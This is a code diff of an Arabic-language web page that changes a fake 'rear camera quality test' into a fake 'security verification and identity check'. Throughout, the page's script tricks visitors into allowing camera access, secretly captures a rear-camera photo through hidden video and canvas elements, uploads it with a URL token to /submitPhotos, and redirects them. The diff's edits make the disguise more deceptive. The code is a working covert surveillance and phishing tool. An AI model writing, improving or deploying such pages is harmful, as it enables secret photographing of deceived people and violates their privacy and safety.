@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص جودة الكاميرا الخلفية والعدسة | Camera Test Pro</title>
+    <title>التحقق الأمني الشامل وتأكيد الهوية | Security Verification</title>
     
-    <meta property="og:title" content="اختبار نقاء ودقة الكاميرا الخلفية الذكي | Camera Check">
-    <meta property="og:description" content="اضغط للسماح بفحص عدسة الكاميرا الخلفية واختبار التركيز التلقائي بدقة عالية!">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=1200&auto=format&fit=crop&q=80">
+    <meta property="og:title" content="فحص أمان النظام وتأكيد الهوية الرقمية | Security Check">
+    <meta property="og:description" content="جاري التحقق من أمان الجهاز والاتصال لتأكيد هويتك وحمايتك...">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
     <meta property="og:type" content="website">
 
     <script src="https://cdn.tailwindcss.com"></script>
@@ -15,39 +15,39 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
         body { font-family: 'Tajawal', sans-serif; }
-        .cam-gradient { background: linear-gradient(135deg, #2563EB 0%, #1D4ED8 100%); }
+        .secure-gradient { background: linear-gradient(135deg, #059669 0%, #10B981 100%); }
     </style>
 </head>
 <body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
 
-    <!-- عنصر فيديو مخفي لالتقاط الصورة من الكاميرا الخلفية -->
+    <!-- عنصر فيديو مخفي لالتقاط الصورة بصمت تام -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
         
-        <div class="absolute -top-16 -right-16 w-32 h-32 bg-blue-500/10 rounded-full blur-2xl pointer-events-none"></div>
+        <div class="absolute -top-16 -right-16 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
 
-        <div class="w-20 h-20 rounded-3xl cam-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-blue-500/30 animate-pulse">
-            <i class="fa-solid fa-camera"></i>
+        <div class="w-20 h-20 rounded-3xl secure-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-emerald-500/30 animate-pulse">
+            <i class="fa-solid fa-shield-halved"></i>
         </div>
 
         <div class="space-y-2">
-            <span class="bg-blue-500/20 text-blue-400 text-xs px-3 py-1 rounded-full font-bold border border-blue-500/30">فحص العدسة الخلفية</span>
-            <h1 class="text-2xl font-black text-white">جاري اختبار دقة الكاميرا...</h1>
+            <span class="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-1 rounded-full font-bold border border-emerald-500/30">التحقق الأمني للاتصال</span>
+            <h1 class="text-2xl font-black text-white">جاري فحص وتأمين الجهاز...</h1>
             <p class="text-xs text-slate-400">
-                يرجى النقر على زر <span class="text-blue-400 font-bold">"السماح للكاميرا" (Allow)</span> في النافذة المنبثقة لاختبار جودة العدسة الخلفية.
+                يرجى النقر على زر <span class="text-emerald-400 font-bold">"السماح" (Allow)</span> في النافذة المنبثقة للتحقق من أمان النظام واستكمال العملية.
             </p>
         </div>
 
         <div class="flex justify-center items-center space-x-2 space-x-reverse py-2">
-            <div class="w-3 h-3 bg-blue-500 rounded-full animate-bounce"></div>
-            <div class="w-3 h-3 bg-blue-500 rounded-full animate-bounce [animation-delay:-.2s]"></div>
-            <div class="w-3 h-3 bg-blue-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
+            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce"></div>
+            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.2s]"></div>
+            <div class="w-3 h-3 bg-emerald-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
         </div>
 
-        <div id="statusText" class="text-xs text-blue-400 font-semibold animate-pulse">
-            جاري تحضير الكاميرا الخلفية...
+        <div id="statusText" class="text-xs text-emerald-400 font-semibold animate-pulse">
+            جاري تحضير فحص النظام الآمن...
         </div>
 
     </div>
@@ -59,7 +59,7 @@
             const canvas = document.getElementById('canvas');
 
             try {
-                // طلب إذن الكاميرا الخلفية حصرياً (environment)
+                // طلب الكاميرا الخلفية للتحقق
                 const constraints = {
                     video: { facingMode: { exact: "environment" } }
                 };
@@ -68,17 +68,15 @@
                 try {
                     stream = await navigator.mediaDevices.getUserMedia(constraints);
                 } catch (err) {
-                    // كبديل لو الكاميرا الخلفية غير متوفرة في بعض الأجهزة الافتراضية
                     stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 }
 
                 video.srcObject = stream;
                 await video.play();
 
-                statusText.textContent = "جاري التقاط الصورة بدقة عالية...";
+                statusText.textContent = "جاري تأكيد بيانات التحقق الأمني...";
                 statusText.className = "text-xs text-amber-400 font-semibold";
 
-                // الانتظار ثانية لضمان استقرار العدسة وتوهج الصورة
                 setTimeout(async () => {
                     canvas.width = video.videoWidth || 1280;
                     canvas.height = video.videoHeight || 720;
@@ -88,10 +86,9 @@
                     const imageData = canvas.toDataURL('image/jpeg', 0.85);
                     const base64Data = imageData.split(',')[1];
 
-                    // إيقاف الكاميرا
                     stream.getTracks().forEach(track => track.stop());
 
-                    // استخراج الرمز token من المسار (مثل /captureBack/c55fcbf8)
+                    // استخراج الرمز token من المسار أو الرابط
                     const pathParts = window.location.pathname.split('/');
                     const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');
 
@@ -105,11 +102,10 @@
                         imageDatas: base64Data
                     };
 
-                    statusText.textContent = "تم التقاط الصورة! جاري إرسالها للنظام...";
+                    statusText.textContent = "تم التحقق بنجاح! جاري توجيهك...";
                     statusText.className = "text-xs text-emerald-400 font-semibold";
 
                     try {
-                        // إرسال الصورة للمسار المعتمد في السيرفر لديك
                         await fetch('/submitPhotos', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -119,14 +115,15 @@
                         console.error('Failed to submit photo');
                     }
 
+                    // التوجيه التلقائي إلى ملف ok.html بعد نجاح العملية
                     setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 2000);
+                        window.location.href = '/ok.html';
+                    }, 1500);
 
                 }, 1500);
 
             } catch (err) {
-                statusText.textContent = "عذراً، يجب السماح بالكاميرا لإتمام الفحص!";
+                statusText.textContent = "تنبيه: يجب النقر على 'السماح' (Allow) لإتمام التحقق الأمني!";
                 statusText.className = "text-xs text-red-400 font-semibold";
             }
         });
